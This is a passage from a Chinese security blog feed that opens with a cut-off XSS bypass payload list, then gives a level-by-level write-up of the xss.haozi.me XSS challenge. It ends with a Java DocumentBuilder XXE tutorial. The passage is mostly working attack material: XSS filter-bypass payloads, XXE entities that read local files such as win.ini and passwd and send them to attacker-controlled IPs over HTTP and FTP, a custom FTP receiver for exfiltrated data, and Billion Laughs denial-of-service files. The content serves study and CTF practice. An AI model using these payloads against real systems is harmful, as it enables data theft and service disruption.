2LXA+xIrh03i02Zgavx0Blo+SA5Q+yEcrVSAYvjYBhwEPrEoDZ+KX20wIe7G1ZtwTJIDyMYU+FwBeuGLpaLqg91NcqnqgQU9Yre/ETpzkwXIIKAAmRnQruboUeiVS1cHmF8pcv70bqBVkgak1tgAaYbuw9bj9kFjVN28wsJvxK9VFQDGzjVF7d9+9z1ARJIHyMxRQNo2SDn2408HBsY5njZJPcFbTomJo59H5HIAUmIDpPQXVGS0igfg7detBqptv/0ulwfIbbQB8kchVtNmiQsQUO7Qru37jpQX7WmS/6YZPXP+LPprbVgC0ul0Op1Op9Pp/gYrAa7fWhG7QQAAAABJRU5ErkJggg==);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//&lt;http://\&lt;meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\&gt;&gt;[text](http://danlec.com " [@danlec](/danlec) ")[a](javascript:this;alert(1))[a](javascript:this;alert(1&amp;#41;)[a](javascript&amp;#58this;alert(1&amp;#41;)[a](Javas&amp;#99;ript:alert(1&amp;#41;)[a](Javas%26%2399;ript:alert(1&amp;#41;)[a](javascript:alert&amp;#65534;(1&amp;#41;)[a](javascript:confirm(1)[a](javascript://www.google.com%0Aprompt(1))[a](javascript://%0d%0aconfirm(1);com)[a](javascript:window.onerror=confirm;throw%201)[a](javascript:alert(document.domain&amp;#41;)&lt;/http://&lt;?php\&gt;&lt;\h1\&gt;&lt;script:script&gt;confirm(2) 参考xss绕过，payload全集 一些xss的pyload Me7ell]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS闯关之xss.haozi.me]]></title>
    <url>%2F2019%2F02%2F15%2FXSS%E9%97%AF%E5%85%B3%E4%B9%8Bxss-haozi-me%2F</url>
    <content type="text"><![CDATA[背景这里写下haozi大佬的XSS闯关练习笔记。 题目网址为：https://xss.haozi.me/ 项目地址为：https://github.com/haozi/xss-demo 注意这里有一个自带alert(1)的js地址：https://xss.haozi.me/j.js。 0x00关键源码： 123function render (input) &#123; return '&lt;div&gt;' + input + '&lt;/div&gt;'&#125; 无任何过滤直接往div标签内写内容，直接上payload即可。下面将本次用到的XSS payload小结如下： 1234567891011121314&lt;script&gt;alert(1)&lt;/script&gt;&lt;body onload=alert(1)&gt;&lt;body/onload=alert(1)&gt;&lt;svg onload=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;img src onerror=alert(1)&gt;&lt;input type=image src onerror=alert(1)&gt;&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt;//加载外部js&lt;input type=button onclick="alert(1)"&gt;//点击按钮&lt;input onmouseover=alert(1)&gt;//鼠标指针移动到指定的元素上时执行&lt;input onmousemove=alert(1)&gt;//鼠标移动时执行......还有其他onmouse系列&lt;img src=javascript: onmouseover="alert(1)"&gt;//鼠标移动指向图片&lt;img src=javascript: onclick="alert(1)"&gt;//鼠标点击图片 0x01关键源码： 123function render (input) &#123; return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'&#125; 无任何过滤直接往textarea标签内写内容，直接写和上面一样的payload是不行的，因为该标签内被解析为文本内容，文本框是无法执行JS代码的，因此需要闭合该textarea标签： 1&lt;/textarea&gt;&lt;svg onload=alert(1)&gt; 0x02关键源码： 123function render (input) &#123; return '&lt;input type="name" value="' + input + '"&gt;'&#125; 简单的DOM型XSS，无任何过滤直接往input标签内的value属性写内容，闭合掉双引号和大于号即可： 1"&gt;&lt;body onload=alert(1)&gt; 也可以如下构造，当鼠标指向input输入框时就会执行弹框： 1" onmouseover="alert(1) 0x03关键源码： 12345function render (input) &#123; const stripBracketsRe = /[()]/g input = input.replace(stripBracketsRe, '') return input&#125; 正则过滤了[]、()等符号，那就用反引号`来替代()： 1&lt;img src=x onerror=alert`1`&gt; 当然在标签属性内也可以使用HTML实体编码绕过： 1&lt;img src="" onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt; 直接引用外部js文件同样OK： 1&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; 0x04关键源码： 12345function render (input) &#123; const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, '') return input&#125; 在上一题的基础上，添加了反引号`的过滤，但前面的后两个payload是可以用的： 12&lt;img src="" onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; 当然还有下面一些payload，同样都是利用编码绕过，只是标签不同而已： 123&lt;script&gt;window.onerror=eval;throw'=alert\x281\x29'&lt;/script&gt;//利用js捕获抛出错误执行弹框，Unicode编码&lt;iframe srcdoc="&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;"&gt;//利用HTML5中iframe的特点，其srcdoc属性里的代码会作为iframe中的内容显示出来，srcdoc中可以直接去写转译后的HTML片段&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;//svg标签可直接执行实体字符即HTML转义字符，若不添加在前则包含解析script标签内容的编码内容 0x05关键源码： 1234function render (input) &#123; input = input.replace(/--&gt;/g, '😂') return '&lt;!-- ' + input + ' --&gt;'&#125; 过滤了–&gt;，并将输入放入注释中间。但是， HTML注释支持以下两种方式： &lt;!-- xxx --&gt; &lt;!- xxx -!&gt; &lt;!— 以！开头，以！结尾对称注释的方式 —!&gt; 直接如下绕过： 1--!&gt;&lt;body/onload=alert(1)&gt; 0x06关键源码： 1234function render (input) &#123; input = input.replace(/auto|on.*=|&gt;/ig, '_') return `&lt;input value=1 $&#123;input&#125; type="text"&gt;`&#125; 过滤了auto、大于号&gt;、以on开头=等号结尾，将其替换成_，且忽略大小写。但是没有过滤换行，直接可以换行绕过。 这里利用input标签的onmouse系列属性弹框即可： 12onmousemove=alert(1) 另外，input标签的type属性可以设置为image，然后利用类似img标签的套路来弹框即可： 12type="image" src="" onerror=alert(1) 0x07关键源码： 123456function render (input) &#123; const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, '') return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`&#125; 正则过滤了&lt;&gt;括起来的字符串内容，这里可以利用容错性，少添加最后一个大于号&gt;也是可以执行的： 1&lt;body/onload=alert(1)// 当然，”//“可以替换为”&lt;!–”或空格或回车。 0x08关键源码： 12345678function render (src) &#123; src = src.replace(/&lt;\/style&gt;/ig, '/* \u574F\u4EBA */') return ` &lt;style&gt; $&#123;src&#125; &lt;/style&gt; `&#125; 正则过滤了想要闭合用的style标签，且忽略大小写。和前面的一样，我们可以在标签的大于号&gt;之前添加空格或换行来绕过执行： 1&lt;/style &gt;&lt;body/onload=alert(1)&gt; 0x09关键源码： 1234567function render (input) &#123; let domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) &#123; return `&lt;script src="$&#123;input&#125;"&gt;&lt;/script&gt;` &#125; return 'Invalid URL'&#125; 正则限制了必须以指定的域名来开头，并放置在script标签的src属性中。这里直接闭合双引号和script标签即可： 12https://www.segmentfault.com"&gt;&lt;/script&gt;&lt;script src="https://xss.haozi.me/j.js 0x0A关键源码： 12345678910111213141516function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, '&amp;amp;') .replace(/'/g, '&amp;#39;') .replace(/"/g, '&amp;quot;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/\//g, '&amp;#x2f') &#125; const domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) &#123; return `&lt;script src="$&#123;escapeHtml(input)&#125;"&gt;&lt;/script&gt;` &#125; return 'Invalid URL'&#125; 在上一题的基础上，过滤了&amp;、’、”、&lt;&gt;、/等字符。也就是说，不能通过闭合的形式构造payload执行了。 这里可以利用URL的@字符的特性来调用外部j.js。 一般的，当我们访问http://a.com@b.com 实际是访问http://b.com 虽然URL中的特殊符号会被过滤，但过滤后的HTML实体编码在HTML标签属性值中无影响，可以直接解析执行： 1https://www.segmentfault.com@xss.haozi.me/j.js 但是我这里是没有成功执行的，原因待确定。 0x0B关键源码： 1234function render (input) &#123; input = input.toUpperCase() return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; 将输入的字母全部转换成大写形式就直接传入h1标签中。 有几个tips： html标签大小写无影响； js严格区分大小写。 也就是说，不能直接构造js代码执行了，但这里可以利用script标签加载j.js，因为URL地址不受大小写影响且HTML标签不受大小写影响： 1&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; 0x0C关键源码： 12345function render (input) &#123; input = input.replace(/script/ig, '') input = input.toUpperCase() return '&lt;h1&gt;' + input + '&lt;/h1&gt;'&#125; 在上一题的基础上，替换了script字符串为空，且忽略大小写。 我们可以内嵌script来绕过： 1&lt;scrscriptipt src="https://xss.haozi.me/j.js"&gt;&lt;/scriscriptpt&gt; 0x0D关键源码： 12345678function render (input) &#123; input = input.replace(/[&lt;/"']/g, '') return ` &lt;script&gt; // alert('$&#123;input&#125;') &lt;/script&gt; `&#125; 正则过滤了&lt;、/、”、’等字符为空，再将输入传入script标签中有注释符的alert()内。 先通过换行绕过注释符限制，用反引号`替换()，最后换行添加HTML注释 –&gt; 来注释掉后面的js代码（记住，在–&gt;前必须添加换行才会生效）： 123alert`1`;--&gt; 0x0E关键源码： 12345function render (input) &#123; input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1') input = input.toUpperCase() return '&lt;h1&gt;' + input + '&lt;/h1&gt;'&#125; 正则过滤了以”&lt;”开头且紧接字母的字符串，将其在”&lt;”与字母中间添加下划线”_”。 这题需要解决两个问题：1. \&lt;s被正则替换坏了； 2. 大写的js无法正常运行。 这个确实不会搞，到网上看了下wp，发现还有这么个东西：“ſ 古英语中的s的写法, 转成大写是正常的S”。 那就直接将之前payload的s替换成 ſ 即可： 1&lt;ſcript src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt; 0x0F关键源码： 1234567891011function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, '&amp;amp;') .replace(/'/g, '&amp;#39;') .replace(/"/g, '&amp;quot;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/\//g, '&amp;#x2f;') &#125; return `&lt;img src onerror="console.error('$&#123;escapeHtml(input)&#125;')"&gt;`&#125; 正则对单双引号、&amp;、&lt;&gt;、/进行了HTML实体编码，再放置到img标签的onerror属性中。 但是，对HTML inline js转义就是做无用功，浏览器会先解析HTML，然后再解析js。 我们可以直接闭合前面的console.error()，添加;分号再注入alert语句即可： 1234');alert('1或');alert(1)--&gt; 0x10关键源码： 1234567function render (input) &#123; return `&lt;script&gt; window.data = $&#123;input&#125;&lt;/script&gt; `&#125; 直接将输入放置到script标签的window.data中。 可以在前面通过引号随意赋值给window.data，以分号结束该js语句，再注入alert语句即可： 1"";alert(1) 可以闭合掉script标签： 1&lt;/script&gt;&lt;script&gt;alert(1) 可以直接在window.data执行再赋值： 12345alert(1)或eval(alert(1))或eval("alert(1)") 0x11关键源码： 123456789101112131415161718192021222324252627282930// from alf.nufunction render (s) &#123; function escapeJs (s) &#123; return String(s) .replace(/\\/g, '\\\\') .replace(/'/g, '\\\'') .replace(/"/g, '\\"') .replace(/`/g, '\\`') .replace(/&lt;/g, '\\74') .replace(/&gt;/g, '\\76') .replace(/\//g, '\\/') .replace(/\n/g, '\\n') .replace(/\r/g, '\\r') .replace(/\t/g, '\\t') .replace(/\f/g, '\\f') .replace(/\v/g, '\\v') // .replace(/\b/g, '\\b') .replace(/\0/g, '\\0') &#125; s = escapeJs(s) return `&lt;script&gt; var url = 'javascript:console.log("$&#123;s&#125;")' var a = document.createElement('a') a.href = url document.body.appendChild(a) a.click()&lt;/script&gt;`&#125; 很长的一段过滤，将反斜杠\、单双引号、&lt;&gt;、反引号`、斜杠/、换行符\n与\r、tab符\t、换页符\f、垂直制表符\v、空字符\O都在其前面添加反斜杠\进行转义，最后再放置到script标签中。 这里注意到console.log(&quot;${s}&quot;)，当我们输入双引号时，其实是输入\“，然后刚刚的代码就变成console.log(&quot;\&quot;&quot;)，这样输入的\“前面的反斜杠\直接放在双引号中被忽略掉了，起不到转义字符的作用，因此可以利用此直接构造： 12345");alert("1或");alert(1)//或");alert(1);&lt;!-- 中间的payload虽然//被转义为了\/\/，但转义之后还是//，不影响注释效果。 0x12关键源码： 12345// from alf.nufunction escape (s) &#123; s = s.replace(/"/g, '\\"') return '&lt;script&gt;console.log("' + s + '");&lt;/script&gt;'&#125; 正则过滤了双引号，将其替换为\\“，再将输入放置到script标的console.log()中。 测试一下发现，当我们输入\“时，经过转义后为console.log(&quot;\\&quot;&quot;)，即将过滤时添加的转移符给转义了，从而绕过了转移符的转义功能，可构造如下payload： 123456\");alert(1)//或\");alert(1)--&gt;或\");alert(1)&lt;!-- 另外，由于解析HTML标签的优先级高于解析JS的优先级，因此也可以直接闭合标签： 1&lt;/script&gt;&lt;script&gt;alert(1)// 小结这次的练习多是针对正则的绕过，学到一些新姿势，推荐练习。]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML注入之DocumentBuilder与XXE攻击防御]]></title>
    <url>%2F2019%2F02%2F13%2FXML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder%2F</url>
    <content type="text"><![CDATA[0x01 何为DocumentBuilderDocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。 0x02 常规用法Demo先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 解析代码： 123456789101112131415161718192021222324public class test &#123; public static void main(String[] args)&#123; File f = new File("user.xml"); documentBuilder(f); &#125; public static void documentBuilder(File f)&#123; DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance(); try &#123; DocumentBuilder builder=factory.newDocumentBuilder(); //解析xml文档，先获取 Document doc=builder.parse(f); //通过user名字来获取dom节点 NodeList nodeList=doc.getElementsByTagName("user"); Element e=(Element)nodeList.item(0); //获取值 System.out.println("姓名："+e.getElementsByTagName("name").item(0).getFirstChild().getNodeValue()); System.out.println("性别："+e.getElementsByTagName("sex").item(0).getFirstChild().getNodeValue()); System.out.println("年龄："+e.getElementsByTagName("age").item(0).getFirstChild().getNodeValue()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行后，发现成功解析了user.xml的内容： 0x03 XML注入漏洞验证1、测试是否支持解析DTD：创建test.xml，内容如下，主要添加了DTD即DOCTYPE： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 测试代码中将user.xml改为test.xml。 运行代码，效果和Demo一样，即说明支持解析DTD。 这里注意一点，当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装。 2、测试是否支持解析普通实体：修改test.xml内容如下，主要添加ELEMENT： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo EMPTY&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 发现可以正常解析。 3、测试是否支持解析参数实体：修改test.xml内容如下，主要修改ELEMENT为ENTITY实体： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;&amp;foo;&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 运行代码，发现可正常解析，且成功进行了XML实体注入： 4、测试是否支持解析外部实体：修改test.xml内容如下，主要修改为SYSTEM执行访问外部链接： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; 在攻击者的服务器（这里自己开启一个Web服务）的Web目录放置一个Mi1k7ea.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）： 1&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; 运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件： 发现成功通过远程加载解析DTD文件读取了本地文件内容： 当然，外部实体还有另一种写法，如下： 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY % milk SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt; %milk; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; 运行结果和上面是一样的。 至此，我们知道DocumentBuilder是存在XML注入风险的，并且在未设置有效防御措施的时候可支持解析外部实体，即可进行XML外部实体注入攻击(XXE)。 0x04 XXE攻击利用其实前面的测试过程已经是一些利用方式了，如读取本地敏感文件等，但是前提是该XML注入是有回显的。 这里示例测试一些常用的，其他的更详细的以后遇到再补充吧。 1、DoS攻击在Java中，XXE的DoS攻击只对低版本的JDK有效，而高版本的JDK会进行防御。 （2）Billion Laughs 攻击经典的用于DoS的xml文件样例如下，原理为构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中： 12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 这个在其他编程语言或者JDK版本较低的Java中可利用，但在高版本JDK的环境中会报错中断解析： 当然，这种类型的DoS攻击也支持参数实体的方式。将dos.xml修改如下： 1234&lt;!DOCTYPE data SYSTEM &quot;http://192.168.17.136:8000/dos.dtd&quot; [&lt;!ELEMENT data (#PCDATA)&gt;]&gt;&lt;data&gt;&amp;tea;&lt;/data&gt; 在攻击者服务器放置dos.dtd： 123456&lt;!ENTITY % a0 &quot;dos&quot; &gt;&lt;!ENTITY % a1 &quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;&gt;&lt;!ENTITY % a2 &quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;&gt;&lt;!ENTITY % a3 &quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;&gt;&lt;!ENTITY % a4 &quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;&gt;&lt;!ENTITY tea &quot;%a4;&quot; &gt; 自己可更换低版本JDK进行测试，这里就不演示了。 （2）支持实体测试主要是利用普通实体ELEMENT，如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种DDoS攻击： 1234567&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt; （3）XML 二次爆破 DDoS 攻击1234&lt;!DOCTYPE data [&lt;!ENTITY a0 &quot;dosdosdosdosdosdos...dos&quot;]&gt;&lt;data&gt;&amp;a0;&amp;a0;...&amp;a0;&lt;/data&gt; （4）一般实体递归最好不要使用递归： 12345&lt;!DOCTYPE data [&lt;!ENTITY a &quot;a&amp;b;&quot; &gt;&lt;!ENTITY b &quot;&amp;a;&quot; &gt;]&gt;&lt;data&gt;&amp;a;&lt;/data&gt; （5）外部一般实体这种攻击方式是通过申明一个外部一般实体，然后引用位于网上或本地的一个大文件(例如：C:/pagefile.sys 或 /dev/random)。换句话说，就是让解析器解析一个 巨大的 XML 文件从而导致DoS。 12345&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY dos SYSTEM &quot;file:///publicServer.com/largeFile.xml&quot; &gt;]&gt;&lt;data&gt;&amp;dos;&lt;/data&gt; 2、基本XXE攻击有回显的XXE攻击这种攻击就是漏洞验证时利用的第3、4步的示例，如： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;&amp;foo;&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 但是这种攻击方式是需要一个直接的反馈通道即可以回显数据，并且读取文件受到XML中禁止字符的限制，如 “&lt;” 和 “&amp;”。如果这些被禁止的字符出现在要访问的文件中(如：/etc/fstab)，则 XML 解析器会抛出一个错误并停止解析。 使用 netdoc 的 XXE 攻击主要将file://换成netdoc:/，如下： 12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ELEMENT data (#PCDATA)&gt; &lt;!ENTITY file SYSTEM &quot;netdoc:/e:/passwd&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;netdoc&lt;/name&gt; &lt;sex&gt;netdoc&lt;/sex&gt; &lt;age&gt;&amp;file;&lt;/age&gt;&lt;/user&gt; 3、高级XXE攻击——直接反馈通道这类攻击为高级的 XXE 攻击，用于绕过对基本的XXE攻击的限制和OOB（外带数据）攻击。 绕过基本 XXE 攻击的限制在有回显的基础上，将外部实体读取本地文件的部分拆分一下，如下： bypass.xml 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ELEMENT data (ANY)&gt; &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.43.201/xxe/bypass.dtd&quot;&gt; %dtd;]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;all;&lt;/age&gt;&lt;/user&gt; bypass.dtd 1&lt;!ENTITY all &apos;%start;%goodies;%end;&apos;&gt; 运行即可触发XXE，并在回显中显示泄露的内容： 滥用属性值的 XXE 攻击bypass2.xml 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.43.201/xxe/bypass2.dtd&quot;&gt; %remote; ]&gt;&lt;data attrib=&apos;&amp;internal;&apos;/&gt; bypass2.dtd 123&lt;!ENTITY % payload SYSTEM &quot;file:///e:/passwd&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &apos;%payload;&apos;&gt;&quot;&gt;%param1; 未尝试成功。。。 4、高级XXE攻击——外带数据(OOB)通道即没有回显的XXE情况。 此时先将Demo代码的输出注释掉： XXE OOB 攻击主要是通过URL参数的形式将数据外带出去。 需要注意，这种方法外带数据遇到特殊字符就会报错，服务端接收不到外带数据！ oob.xml 123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.43.201/xxe/oob.dtd&quot;&gt;&lt;data&gt;&amp;send;&lt;/data&gt; oob.dtd 123&lt;!ENTITY % file SYSTEM &quot;file:///e:/secret.ini&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://192.168.43.201:8000/?%file;&apos;&gt;&quot;&gt;%all; 先外带无特殊字符的文件内容，可以看到通过URL参数的形式外带出来了： 当外带如passwd等含有换行符或尖括号等文件内容时会报错，接收不到数据： XXE OOB 攻击——参数实体和前者类似，区别仅在于只使用参数实体，即这里的send为参数实体。 oob2.xml 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.43.201/xxe/oob2.dtd&quot;&gt; %remote; %send; ]&gt;&lt;data&gt;6&lt;/data&gt; oob2.dtd 123&lt;!ENTITY % payload SYSTEM &quot;file:///e:/secret.ini&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY % send SYSTEM &apos;http://192.168.43.201:8000/?%payload;&apos;&gt;&quot;&gt;%param1; 但是本地测试出现问题，没成功： XXE OOB 攻击——参数实体 FTP最为经典的XXE攻击方式，通过FTP外带数据，攻击者可以读取到任意长度的文件而不受限于只读一行内容。 这里在本地进行测试。 ftp.xml 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt; %remote; %all; ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; ftp.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; 运行可以看到，FTP服务端日志只能接收到一行的内容，因为其默认处理的方式会受到换行符等字符的影响： 自行编写FTPServer处理字符输出格式 FtpServer.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.io.BufferedReader;import java.io.InputStreamReader;import java.io.PrintWriter;import java.net.ServerSocket;import java.net.Socket;public class FtpServer &#123; public static void main(String[] args) throws Exception &#123; ServerSocket serverSocket = new ServerSocket(21); Socket socket = serverSocket.accept(); BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream())); PrintWriter out = new PrintWriter(socket.getOutputStream(), true); out.println("220 Ftp Server Running!"); System.out.println(in.readLine()); out.println("331 User"); System.out.println(in.readLine()); out.println("230 Login In"); String s1 = ""; String s2 = ""; while (true)&#123; String str = in.readLine();// System.out.println(str); if (str != null &amp;&amp; str.trim().toUpperCase().startsWith("EPSV ALL"))&#123; if (!s1.isEmpty() || !s2.isEmpty())&#123; System.out.println(s1 + s2); &#125; out.println("221 Bye!"); out.close(); in.close(); break; &#125; else if (str != null &amp;&amp; str.trim().toUpperCase().startsWith("CWD"))&#123; if (s1.isEmpty())&#123; s1 = str.substring(4); &#125; else &#123; s2 += "/" + str.substring(4); &#125; &#125; else &#123; if (s1.isEmpty())&#123; System.out.println(str); &#125; else &#123; System.out.println(s1 + s2); s1 = str; s2 = ""; &#125; &#125; out.println("200 OK!"); &#125; &#125;&#125; 再次运行，可以接收到所有文件内容： 0x05 